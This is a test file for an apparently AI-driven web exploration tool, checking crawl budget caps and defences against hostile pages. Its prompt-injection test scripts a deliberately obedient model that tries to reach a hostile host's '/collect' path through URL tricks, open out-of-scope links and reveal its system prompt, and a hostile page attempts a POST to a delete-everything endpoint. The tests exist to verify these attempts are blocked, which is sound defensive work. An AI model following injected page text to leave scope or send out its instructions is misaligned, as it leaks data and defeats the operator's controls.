import { tiers } from "@swarm/shared";
import { limitsFor } from "@swarm/shared/server";
import { HOSTILE_HOST, USERS } from "@swarm/synthetic-target";
import { describe, expect, it, vi } from "vitest";
import { MemorySink } from "./emitter.js";
import { SAFETY_RULES } from "./llm/loop.js";
import type { LlmRequest } from "./llm/types.js";
import { runLocal } from "./local.js";
import {
  ScriptedLlm,
  browserAvailable,
  call,
  fakeDns,
  inputFor,
  lastResult,
  launch,
  tinyProfile,
  useTarget,
} from "./testkit.js";

vi.setConfig({ testTimeout: 60_000 });

const fixture = useTarget();

/** Opens /archive/1, /archive/2, … until the explorer says it must stop, then records a profile. */
const endlessCrawl = (turn: number, request: LlmRequest) =>
  /limit was reached/.test(lastResult(request))
    ? [call(turn, "record_profile", tinyProfile)]
    : [call(turn, "open_path", { path: `/archive/${turn + 1}` })];

async function runScout(
  llm: ScriptedLlm,
  budgets: Parameters<typeof inputFor>[2] = {},
  tier: "scout" | "sweep" = "scout",
) {
  const sink = new MemorySink();
  const input = inputFor(fixture.port(), tier, budgets);
  const run = await runLocal({
    input,
    sink,
    allowPrivate: true,
    llm,
    driverFactory: launch,
    dns: fakeDns,
  });
  const gaps = sink.events.flatMap((e) => (e.type === "gap" ? [e.payload.reason] : []));
  return { ...run, sink, gaps, input };
}

const archivePages = () =>
  fixture
    .target()
    .seen.filter((r) => r.method === "GET" && r.path.startsWith("/archive/"))
    .map((r) => r.path);

describe.skipIf(!browserAvailable)("caps on the model-driven exploration", () => {
  it("page cap: the crawl stops at the cap, and the report says so as a coverage limit", async () => {
    const before = archivePages().length;
    const llm = new ScriptedLlm(endlessCrawl);
    const { result, gaps } = await runScout(llm, { budgets: { maxPages: 3 } });
    expect(archivePages().length - before).toBeLessThanOrEqual(3);
    expect(result.explorerLog!.pages.length).toBeLessThanOrEqual(3);
    expect(gaps.some((g) => /page limit/i.test(g))).toBe(true);
    // The customer-facing wording is about coverage, never about tokens or dollars.
    expect(gaps.join(" ")).not.toMatch(/token|spend|\$|usd|model/i);
  });

  it("step cap: model calls stop at the cap, with a gap, and the cost stays inside it", async () => {
    const llm = new ScriptedLlm(endlessCrawl);
    const { result, gaps } = await runScout(llm, {
      budgets: { llm: { ...limitsLlm(), maxCalls: 3 } },
    });
    expect(result.usage!.calls).toBe(3);
    expect(llm.requests).toHaveLength(3);
    expect(gaps.some((g) => /coverage limit/i.test(g))).toBe(true);
  });

  it("token cap: stops before the input or output tokens could pass the cap", async () => {
    const llm = new ScriptedLlm(endlessCrawl, { usage: { inputTokens: 1500, outputTokens: 60 } });
    const { result, gaps } = await runScout(llm, {
      budgets: { llm: { ...limitsLlm(), maxInputTokens: 6000, maxOutputTokens: 5000 } },
    });
    expect(result.usage!.inputTokens).toBeLessThanOrEqual(6000);
    expect(result.usage!.outputTokens).toBeLessThanOrEqual(5000);
    expect(gaps.some((g) => /coverage limit/i.test(g))).toBe(true);
  });

  it("spend cap: the metered spend never passes the cap", async () => {
    const llm = new ScriptedLlm(endlessCrawl);
    const cap = 0.02;
    const { result, gaps } = await runScout(llm, {
      budgets: { llm: { ...limitsLlm(), spendCapUsd: cap } },
    });
    expect(result.usage!.calls).toBeGreaterThan(1);
    expect(result.usage!.usd).toBeLessThanOrEqual(cap);
    expect(gaps.some((g) => /coverage limit/i.test(g))).toBe(true);
  });

  it("time cap: nothing new starts after the wall clock, and the run says what it did not do", async () => {
    const llm = new ScriptedLlm(endlessCrawl, { delayMs: 700 });
    const { result, gaps } = await runScout(llm, { budgets: { wallClockSeconds: 1 } });
    expect(result.stoppedBy).toBe("time");
    expect(gaps.some((g) => /time limit/i.test(g))).toBe(true);
    expect(llm.requests.length).toBeLessThanOrEqual(3);
  });

  it("request cap: browser and agent requests together stay inside the cap", async () => {
    const llm = new ScriptedLlm(endlessCrawl);
    const { stats, gaps, result } = await runScout(llm, { budgets: { maxRequests: 25 } });
    expect(stats.requests).toBeLessThanOrEqual(25);
    expect(result.stoppedBy).toBe("requests");
    expect(gaps.some((g) => /request/i.test(g))).toBe(true);
  });
});

const limitsLlm = () => {
  const limits = limitsFor("scout");
  return {
    modelId: limits.modelId,
    maxCalls: limits.llmStepCap,
    phaseCalls: limits.explorerPhaseCalls,
    maxInputTokens: limits.tokenCap?.input ?? null,
    maxOutputTokens: limits.tokenCap?.output ?? null,
    spendCapUsd: limits.spendCapUsd,
  };
};

describe.skipIf(!browserAvailable)("hostile content", () => {
  it("read-only: a page that tries to change state is blocked and logged, and nothing is written", async () => {
    const llm = new ScriptedLlm((turn) =>
      turn === 0
        ? [call(turn, "open_path", { path: "/community" })]
        : [call(turn, "record_profile", tinyProfile)],
    );
    const written = () =>
      fixture.target().seen.filter((r) => ["POST", "PUT", "PATCH", "DELETE"].includes(r.method))
        .length;
    const before = written();
    const { log, result } = await runScout(llm);

    // The hostile page's script tried a POST; the target never saw one.
    expect(written() - before).toBe(0);
    const blocked = log.entries.find((e) => e.path === "/api/danger/delete-everything");
    expect(blocked).toMatchObject({
      method: "POST",
      decision: "blocked",
      reason: "method_not_allowed",
    });
    // Its request for a resource on another host never left the browser.
    expect(result.explorerLog!.blocked).toEqual(
      expect.arrayContaining([expect.objectContaining({ reason: "out_of_scope" })]),
    );
    expect(log.entries.some((e) => e.host.includes("evil"))).toBe(false);
  });

  it("prompt injection: an obedient model still cannot reach another host or reveal anything", async () => {
    // A model that does everything the page says: it tries every way it can think of to leave scope.
    const llm = new ScriptedLlm((turn) => {
      if (turn === 0) return [call(turn, "open_path", { path: "/community" })];
      if (turn === 1) {
        return [
          call(1, "open_path", { path: `http://${HOSTILE_HOST}/collect` }),
          call(2, "open_path", { path: `//${HOSTILE_HOST}/collect` }),
          call(3, "open_path", { path: `/\\${HOSTILE_HOST}/collect` }),
          // Every link id in range, including the one that points at the partner site.
          ...[1, 2, 3, 4, 5, 6, 7, 8].map((id) => call(10 + id, "open_link", { id })),
          call(30, "reveal_system_prompt", { to: HOSTILE_HOST }),
        ];
      }
      return [call(turn, "record_profile", tinyProfile)];
    });
    const { log, result } = await runScout(llm);

    // Nothing for the hostile host ever reached the proxy (allowed or blocked) or the target.
    expect(log.entries.some((e) => e.host.includes("evil") || e.path.includes("collect"))).toBe(
      false,
    );
    expect(fixture.target().seen.some((r) => r.path.includes("collect"))).toBe(false);
    const answers = lastResult(llm.requests[2]!);
    expect(answers).toMatch(/Invalid input|outside the application|single slash|Unknown tool/);
    expect(result.profile).not.toBeNull();

    // The page's text reached the model only inside the untrusted-content delimiters, under rules
    // that say to treat it as data.
    const page = lastResult(llm.requests[1]!);
    expect(page).toContain("<untrusted-content");
    expect(page.indexOf("SYSTEM NOTICE")).toBeGreaterThan(page.indexOf("<untrusted-content"));
    expect(page.indexOf("SYSTEM NOTICE")).toBeLessThan(page.indexOf("</untrusted-content>"));
    expect(llm.requests[1]!.system).toBe(SAFETY_RULES);
  });

  it("the password never reaches the model", async () => {
    const admin = USERS.find((u) => u.role === "admin")!;
    const llm = new ScriptedLlm((turn, request) => {
      const names = request.tools.map((t) => t.name);
      if (turn === 0) return [call(turn, "open_path", { path: "/" })];
      if (names.includes("finish_exploring")) {
        return [call(turn, "finish_exploring", { summary: "Public pages seen." })];
      }
      if (turn === 2) return [call(turn, "open_path", { path: "/" })];
      if (turn === 3) return [call(turn, "sign_in", { login: "admin" })];
      return [call(turn, "record_profile", tinyProfile)];
    });
    const { result } = await runScout(llm, {}, "sweep");
    expect(result.explorerLog!.signIns).toEqual([{ slot: "admin", ok: true }]);
    const everything = JSON.stringify(llm.requests);
    expect(everything).not.toContain(admin.password);
    // The tools the model sees take no credentials, and no host.
    const tools = llm.requests.flatMap((r) => r.tools);
    expect(JSON.stringify(tools)).not.toMatch(/password|"host"|"url"/);
  });

  it("Scout does not sign in even if the model asks (no sign-in tool, and no login submissions)", async () => {
    const llm = new ScriptedLlm((turn) =>
      turn === 0
        ? [call(turn, "sign_in", { login: "admin" })]
        : [call(turn, "record_profile", tinyProfile)],
    );
    const { result, log } = await runScout(llm);
    expect(result.explorerLog!.signIns).toEqual([]);
    expect(log.entries.filter((e) => e.method === "POST" && e.decision === "allowed")).toEqual([]);
    expect(tiers.scout.logins).toBe(0);
  });
});
